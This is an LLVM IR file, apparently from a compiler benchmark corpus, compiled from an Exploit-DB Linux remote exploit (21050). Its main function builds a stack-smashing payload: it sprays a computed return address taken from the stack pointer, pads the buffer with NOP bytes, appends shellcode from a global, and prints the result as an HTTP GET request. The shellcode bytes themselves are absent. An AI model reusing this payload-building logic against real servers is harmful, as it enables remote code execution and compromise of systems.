; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_21050.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_21050.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@user = common dso_local global i8* null, align 8
@shell = common dso_local global i64 0, align 8
@.str = private unnamed_addr constant [8 x i8] c"GET %s\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i64, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 160, i32* %7, align 4
  %9 = load i32, i32* %4, align 4
  %10 = icmp sgt i32 %9, 1
  br i1 %10, label %11, label %16

11:                                               ; preds = %2
  %12 = load i8**, i8*** %5, align 8
  %13 = getelementptr inbounds i8*, i8** %12, i64 1
  %14 = load i8*, i8** %13, align 8
  %15 = call i32 @atoi(i8* %14)
  store i32 %15, i32* %7, align 4
  br label %16

16:                                               ; preds = %11, %2
  %17 = call i32 (...) @get_esp()
  %18 = load i32, i32* %7, align 4
  %19 = sub nsw i32 %17, %18
  %20 = sext i32 %19 to i64
  store i64 %20, i64* %8, align 8
  store i32 1, i32* %6, align 4
  br label %21

21:                                               ; preds = %31, %16
  %22 = load i32, i32* %6, align 4
  %23 = icmp slt i32 %22, 264
  br i1 %23, label %24, label %34

24:                                               ; preds = %21
  %25 = load i64, i64* %8, align 8
  %26 = load i8*, i8** @user, align 8
  %27 = load i32, i32* %6, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds i8, i8* %26, i64 %28
  %30 = bitcast i8* %29 to i64*
  store i64 %25, i64* %30, align 8
  br label %31

31:                                               ; preds = %24
  %32 = load i32, i32* %6, align 4
  %33 = add nsw i32 %32, 4
  store i32 %33, i32* %6, align 4
  br label %21

34:                                               ; preds = %21
  store i32 0, i32* %6, align 4
  br label %35

35:                                               ; preds = %46, %34
  %36 = load i32, i32* %6, align 4
  %37 = load i64, i64* @shell, align 8
  %38 = call i32 @strlen(i64 %37)
  %39 = sub nsw i32 260, %38
  %40 = icmp slt i32 %36, %39
  br i1 %40, label %41, label %49

41:                                               ; preds = %35
  %42 = load i8*, i8** @user, align 8
  %43 = load i32, i32* %6, align 4
  %44 = sext i32 %43 to i64
  %45 = getelementptr inbounds i8, i8* %42, i64 %44
  store i8 -112, i8* %45, align 1
  br label %46

46:                                               ; preds = %41
  %47 = load i32, i32* %6, align 4
  %48 = add nsw i32 %47, 1
  store i32 %48, i32* %6, align 4
  br label %35

49:                                               ; preds = %35
  %50 = load i64, i64* @shell, align 8
  %51 = load i32, i32* %6, align 4
  %52 = sext i32 %51 to i64
  %53 = add nsw i64 %50, %52
  %54 = load i64, i64* @shell, align 8
  %55 = load i64, i64* @shell, align 8
  %56 = call i32 @strlen(i64 %55)
  %57 = call i32 @memcpy(i64 %53, i64 %54, i32 %56)
  %58 = load i8*, i8** @user, align 8
  %59 = call i32 @printf(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str, i64 0, i64 0), i8* %58)
  %60 = load i32, i32* %3, align 4
  ret i32 %60
}

declare dso_local i32 @atoi(i8*) #1

declare dso_local i32 @get_esp(...) #1

declare dso_local i32 @strlen(i64) #1

declare dso_local i32 @memcpy(i64, i64, i32) #1

declare dso_local i32 @printf(i8*, i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
